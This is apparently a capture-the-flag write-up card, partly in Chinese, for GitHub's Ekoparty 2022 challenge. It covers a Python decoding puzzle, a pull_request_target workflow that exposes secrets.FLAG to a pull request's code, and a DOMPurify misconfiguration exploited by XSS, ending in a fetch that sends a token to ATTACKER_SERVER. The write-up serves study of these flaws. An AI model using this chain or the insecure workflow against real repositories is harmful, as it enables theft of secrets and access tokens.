---
title: GitHub and the Ekoparty 2022 Capture the Flag
contest: Ekoparty 2022 CTF (GitHub)
year: 2022
difficulty: hard
vuln_type: web_unknown
tags: [github, actions, pull_request_target, dompurify, ticket, xss, 加密]
attack_chain:
  - 第1关: "lesson"字符串循环+1024次循环+32062次+43052次+36582次+813+554772+789+3753+5711
  - 还原p: 3562927236051182334153575355087347127407987755959461320351305838619130268209476696833779953363710389416751
  - hex(p)[2:] → URL部分
  - 第2关: GitHub Actions workflow_run + pull_request_target
  - 攻击PR触发job运行环境拿secrets.FLAG
  - 第3关: /api/dompurify_config返回{configuration:{}} 允许XSS
  - 攻击者构造h4含PAT: env.get('FINAL_EXAM_PAT')
  - admin bot访问ticket
  - fetch /api/profile/2拿about
  - 解析ticket_id引用ticket.content
  - exfil: fetch ATTACKER_SERVER/leak?foo=...
key_payload: hex(p)[2:] + "/" + hex(t)[2:]  # URL
one_liner: GitHub Ekoparty 2022：3关Python加密+Actions+DOMPurify XSS
lesson: GitHub Actions pull_request_target可拿secrets.FLAG
quality: high
---

# GitHub and the Ekoparty 2022 Capture the Flag

## 题目信息
- 比赛：Ekoparty 2022 CTF（GitHub 赞助）
- 类别：Crypto + Web 综合

## 关键攻击链
### 第 1 关：Python 数学题
```python
import binascii
import math
YourFirst = "lesson"
t = int.from_bytes(YourFirst.encode(), byteorder='little')
for i in range(0, 29):
    m = t % 23
    t *= m if m > 2 else 2
for i in range(0, 1024):
    m = i % 27
    t -= pow(m, m) if m > 0 else m * m
# ... 多个循环 ...
t += 328
p = 3562927236051182334153575355087347127407987755959461320351305838619130268209476696833779953363710389416751
print(f'To access the course: "https://" + DECODE({hex(p)[2:]}) + "/{hex(t)[2:]}"')
```
- DECODE 大数 + t hex 部分构成 URL

### 第 2 关：GitHub Actions
```yaml
name: Grade the Pull Request
on:
  workflow_run:
    workflows: ["PR Management"]
    types: [completed]
  pull_request_target:
    branches: [main]
jobs:
  build:
    runs-on: ubuntu-latest
    environment: CTF
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.ref }}
      - name: Grade the Pull Request
        run: ruby grading/script/grading.rb
        env:
          FLAG: ${{ secrets.FLAG }}
```
- 攻击：提交恶意 PR → 触发 workflow_run → secrets.FLAG 可用

### 第 3 关：DOMPurify XSS
```javascript
const getDOMPurifyConfig = async (url) => {
    const response = await getJSONfromURL(url);
    return response.configuration;
}
const sanitize = async (unsafe_html) => {
    const configuration = await getDOMPurifyConfig(window.DOMPurifyConfigURL || "/api/dompurify_config");
    return DOMPurify.sanitize(unsafe_html, configuration);
}
```
- `/api/dompurify_config` 返回空配置 → XSS 风险
- admin bot 访问 ticket
- 攻击者 fetch /api/profile/2 拿 PAT
- exfil: `fetch('ATTACKER_SERVER/leak?foo=' + JSON.stringify(json))`

### 关键票据
```python
ticket = Ticket(
    id=uuid4().hex,
    from_id=2,
    content=f"<h4>Hi team! ... PAT: {os.environ.get('FINAL_EXAM_PAT')}</h4>"
)
```

## 评分
- quality: high（Python 数学 + GitHub Actions + DOMPurify XSS 三关）
